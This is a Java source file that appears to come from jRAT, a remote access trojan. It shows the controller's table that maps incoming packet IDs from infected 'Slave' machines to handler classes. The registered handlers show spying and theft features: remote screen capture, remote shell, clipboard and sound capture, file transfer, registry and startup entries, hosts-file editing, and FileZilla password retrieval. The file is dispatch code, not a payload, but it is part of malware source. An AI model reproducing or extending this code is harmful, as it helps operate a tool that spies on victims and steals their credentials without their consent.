package se.jrat.client.packets.incoming;

import java.util.HashMap;
import java.util.Set;

import se.jrat.client.Slave;
import se.jrat.client.addons.PluginEventHandler;
import se.jrat.common.PacketRange;


public class IncomingPackets {

	private static final HashMap<Byte, Class<? extends AbstractIncomingPacket>> incomingPackets = new HashMap<Byte, Class<? extends AbstractIncomingPacket>>();

	public static HashMap<Byte, Class<? extends AbstractIncomingPacket>> getIncomingPackets() {
		return incomingPackets;
	}

	static {
		reload();
	}

	private static void reload() {
		incomingPackets.clear();

		incomingPackets.put((byte) 4, Packet4InitOperatingSystem.class);
		incomingPackets.put((byte) 5, Packet5InitUserHost.class);
		incomingPackets.put((byte) 6, Packet6InitVersion.class);
		incomingPackets.put((byte) 7, Packet7InitServerID.class);
		incomingPackets.put((byte) 8, Packet8InitCountry.class);
		incomingPackets.put((byte) 9, Packet9InitJavaVersion.class);
		incomingPackets.put((byte) 10, Packet10InitInstallPath.class);

		incomingPackets.put((byte) 36, Packet36Initialized.class);
		incomingPackets.put((byte) 31, Packet31InitInstallationDate.class);
		incomingPackets.put((byte) 26, Packet26InitJavaPath.class);
		incomingPackets.put((byte) 10, Packet10InitDefaultLocale.class);
		incomingPackets.put((byte) 28, Packet28InitLanAddress.class);
		incomingPackets.put((byte) 61, Packet61InitMonitors.class);
		incomingPackets.put((byte) 62, Packet62InitDrives.class);
		incomingPackets.put((byte) 63, Packet63InitRAM.class);
		incomingPackets.put((byte) 64, Packet64InitAvailableCores.class);
		// 69
		// 70
		incomingPackets.put((byte) 11, Packet11InstalledLocales.class);
		incomingPackets.put((byte) 12, Packet12Disconnect.class);
		incomingPackets.put((byte) 13, Packet13Status.class);
		// 14 free
		incomingPackets.put((byte) 17, Packet17RemoteScreen.class);
		incomingPackets.put((byte) 18, Packet18OneRemoteScreen.class);
		incomingPackets.put((byte) 19, Packet19ListFiles.class);
		incomingPackets.put((byte) 20, Packet20Process.class);
		incomingPackets.put((byte) 21, Packet21RemoteShell.class);
		
		incomingPackets.put((byte) 24, Packet24JVMMemory.class);
		
		incomingPackets.put((byte) 27, Packet27URLStatus.class);
		incomingPackets.put((byte) 29, Packet29ReceiveFile.class);
		
		incomingPackets.put((byte) 32, Packet32SystemProperties.class);
		incomingPackets.put((byte) 33, Packet33Thumbnail.class);
		incomingPackets.put((byte) 34, Packet34CustomDirectory.class);
		incomingPackets.put((byte) 35, Packet35ChatMessage.class);
		
		incomingPackets.put((byte) 37, Packet37SearchResult.class);
		incomingPackets.put((byte) 38, Packet38HostFile.class);
		incomingPackets.put((byte) 39, Packet39HostEditResult.class);
		incomingPackets.put((byte) 40, Packet40UTorrentDownload.class);
		incomingPackets.put((byte) 41, Packet41Clipboard.class);
		incomingPackets.put((byte) 42, Packet42PreviewFile.class);
		incomingPackets.put((byte) 43, Packet43PreviewImage.class);
		incomingPackets.put((byte) 44, Packet44SystemJavaProperty.class);
		incomingPackets.put((byte) 45, Packet45ArchivePreview.class);
		incomingPackets.put((byte) 46, Packet46FileHash.class);

		incomingPackets.put((byte) 48, Packet48FileZillaPassword.class);
		incomingPackets.put((byte) 49, Packet49LanDevices.class);
		incomingPackets.put((byte) 50, Packet50IPConfig.class);
		incomingPackets.put((byte) 51, Packet51ActivePort.class);
		incomingPackets.put((byte) 52, Packet52WindowsService.class);
		incomingPackets.put((byte) 53, Packet53RegistryStartup.class);
		incomingPackets.put((byte) 54, Packet54Registry.class);
		incomingPackets.put((byte) 55, Packet55InstalledProgram.class);
		incomingPackets.put((byte) 56, Packet56NetworkAdapter.class);
		// incomingPackets.put((byte) 57, .class);
		incomingPackets.put((byte) 58, Packet58SoundCapture.class);
		incomingPackets.put((byte) 59, Packet59ThumbnailPreview.class);
		incomingPackets.put((byte) 60, Packet60Error.class);
		
		incomingPackets.put((byte) 65, Packet65ErrorLog.class);
		incomingPackets.put((byte) 66, Packet66Config.class);
		incomingPackets.put((byte) 67, Packet67LoadedPlugins.class);
		incomingPackets.put((byte) 68, Packet68RemoteScreenComplete.class);
		
		incomingPackets.put((byte) 71, Packet71AllThumbnails.class);
	}

	public static boolean execute(byte header, Slave slave) {
		try {
			AbstractIncomingPacket ac = null;
			Set<Byte> set = incomingPackets.keySet();

			for (Byte str : set) {
				if (str == header) {
					ac = incomingPackets.get(str).newInstance();
					break;
				}
			}

			if (header >= 0 && header <= PacketRange.incomingRange) {
				ac.read(slave, slave.getDataInputStream());
			} else {
				PluginEventHandler.onPacket(slave, header);
			}

			return ac != null;
		} catch (Exception ex) {
			ex.printStackTrace();
			return false;
		}
	}

}